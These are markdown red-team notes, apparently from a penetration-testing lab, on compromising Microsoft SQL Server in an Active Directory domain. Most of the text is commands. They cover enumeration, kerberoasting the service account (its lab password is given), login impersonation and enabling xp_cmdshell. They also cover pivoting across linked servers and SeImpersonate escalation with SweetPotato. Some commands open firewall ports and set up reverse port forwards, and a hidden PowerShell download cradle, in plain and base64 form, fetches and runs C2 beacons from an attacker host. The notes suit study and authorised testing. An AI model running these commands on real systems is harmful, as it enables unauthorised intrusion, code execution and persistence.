# MS SQL Servers Notes

Tools:
[PowerUpSQL](https://github.com/NetSPI/PowerUpSQL) 
[SQLRecon](https://github.com/skahwah/SQLRecon) [wiki](https://github.com/skahwah/SQLRecon/wiki/)

## Enum
```
powershell-import C:\Tools\PowerUpSQL\PowerUpSQL.ps1
powershell Get-SQLInstanceDomain
test connection:
powershell Get-SQLConnectionTest -Instance "sql-2.dev.cyberbotic.io,1433" | fl
Gather more info:
powershell Get-SQLServerInfo -Instance "sql-2.dev.cyberbotic.io,1433"
for multiple SQL Servers:
powershell Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLServerInfo
Using SQL Recon:
execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /enum:sqlspns
execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /auth:wintoken /host:sql-2.dev.cyberbotic.io /module:info
execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:whoami
```

find any users with access 
```
powershell Get-DomainGroup -Identity *SQL* | % { Get-DomainGroupMember -Identity $_.distinguishedname | select groupname, membername }
```

## attack sql account itself

so if we have a ms sql server account we can try kerberoasting it then use beacons make_token with the cracked password, then run this to abuse
```
execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:windomain /d:dev.cyberbotic.io /u:mssql_svc /p:Cyberb0tic /h:sql-2.dev.cyberbotic.io,1433 /m:whoami
```

## with access

querying
```
powerup:
powershell Get-SQLQuery -Instance "sql-2.dev.cyberbotic.io,1433" -Query "select @@servername"
sqlrecon:
execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:query /c:"select @@servername"
proxychains impacket:
proxychains mssqlclient.py -windows-auth DEV/bfarmer@10.10.122.25
or use proxifier with a sql gui
```

## MS SQL Impersonation

allows the executing user to assume the permissions of another user without needing their password

queries:
```
SELECT * FROM sys.server_permissions WHERE permission_name = 'IMPERSONATE';
look up the output IDs:
SELECT name, principal_id, type_desc, is_disabled FROM sys.server_principals;
```

can use sqlrecon to join these two into one
```
execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:impersonate
```

example of using with queries
```
check user and privs:
SELECT SYSTEM_USER;
SELECT IS_SRVROLEMEMBER('sysadmin');
using the execute as to query in the context of the target:
EXECUTE AS login = 'DEV\mssql_svc'; SELECT SYSTEM_USER;
EXECUTE AS login = 'DEV\mssql_svc'; SELECT IS_SRVROLEMEMBER('sysadmin');
```

with sqlrecon to use impersonation mode
```
execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:iwhoami /i:DEV\mssql_svc
```


## MS SQL Command Execution

using Invoke-SQLOSCmd from PowerupSQL, this enables then disables xp_cmdshell
```
powershell Invoke-SQLOSCmd -Instance "sql-2.dev.cyberbotic.io,1433" -Command "whoami" -RawResults
```

query the usage of xp_cmdshell
```
SELECT value FROM sys.configurations WHERE name = 'xp_cmdshell';
to enable:
sp_configure 'Show Advanced Options', 1; RECONFIGURE;
sp_configure 'xp_cmdshell', 1; RECONFIGURE;
```

sqlrecons but using the /i to impersonate and run
```
execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:ienablexp /i:DEV\mssql_svc
execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:ixpcmd /i:DEV\mssql_svc /c:ipconfig
```

abusing to get a beacon on the sql server
steps:
1. create reverse port forward to tunnel traffic through our C2 chain
2. host smb beacon
3. download and execute beacon, with either b64 cradle or not
4. then link the new beacon

```
powershell New-NetFirewallRule -DisplayName "8080-In" -Direction Inbound -Protocol TCP -Action Allow -LocalPort 8080
rportfwd 8080 127.0.0.1 80
powershell -w hidden -c "iex (new-object net.webclient).downloadstring('http://wkstn-2:8080/b')"
or base64:
powershell -w hidden -enc aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AdwBrAHMAdABuAC0AMgA6ADgAMAA4ADAALwBiACcAKQA=
link sql-2.dev.cyberbotic.io TSVCPIPE-ae2b7dc0-4ebe-4975-b8a0-06e990a41337
```

## MS SQL Lateral Movement

sql servers have links which allows a db instance to access data from an external source

enumerate
```
SELECT srvname, srvproduct, rpcout FROM master..sysservers;
or:
execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:links
```

can send queries to linked source with openquery
```
SELECT * FROM OPENQUERY("sql-1.cyberbotic.io", 'select @@servername');
or sqlrecon:
execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:lquery /l:sql-1.cyberbotic.io /c:"select @@servername"
```

check xp-cmdshell:
```
execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:lquery /l:sql-1.cyberbotic.io /c:"select name,value from sys.configurations WHERE name = ''xp_cmdshell''"
```

If xp_cmdshell is disabled, you won't be able to enable it by executing sp_configure via OpenQuery.  If RPC Out is enabled on the link (which is not the default configuration), then you can enable it using the following syntax:
```
EXEC('sp_configure ''show advanced options'', 1; reconfigure;') AT [sql-1.cyberbotic.io]
EXEC('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT [sql-1.cyberbotic.io]
```

query our link for more links
```
execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:llinks /l:sql-1.cyberbotic.io
or use powerupsql to keep looking recursively for them, this also shows the privs account the sql is set up with:
powershell Get-SQLServerLinkCrawl -Instance "sql-2.dev.cyberbotic.io,1433"
query this with lwhoami for sqlrecon:
execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:lwhoami /l:sql-1.cyberbotic.io
```

## get beacon on new link

keep in mind that the new link my only be able to talk to the new sql server we already popped, so keep that in mind to set up the port forward for traffic. CS will double hop it over so don't worry about setting up the forward to a different one just do so like below in the beacon that can talk to the link.

```
powershell New-NetFirewallRule -DisplayName "8080-In" -Direction Inbound -Protocol TCP -Action Allow -LocalPort 8080
rportfwd 8080 127.0.0.1 80

with Openquery to execute:
SELECT * FROM OPENQUERY("sql-1.cyberbotic.io", 'select @@servername; exec xp_cmdshell ''powershell -w hidden -enc <base64 powershell cradle>''')

or with AT syntax:
EXEC('xp_cmdshell ''powershell -w hidden -enc <base64 cradle>''') AT [sql-1.cyberbotic.io]

```

## MS SQL Privilege Escalation

Tools:
[SweetPotato](https://github.com/CCob/SweetPotato)

typical for sql servers to run as NT Service\MSSQLSERVER, we can upgrade these permissions by abusing SeImpersonatePrivilege
```
check privs
execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe TokenPrivileges
execute-assembly C:\Tools\SweetPotato\bin\Release\SweetPotato.exe -p C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -a "-w hidden -enc <powershell download cradle>
connect localhost 4444
```

doing a connect localhost because we used a tcp beacon which binds to localhost when ran


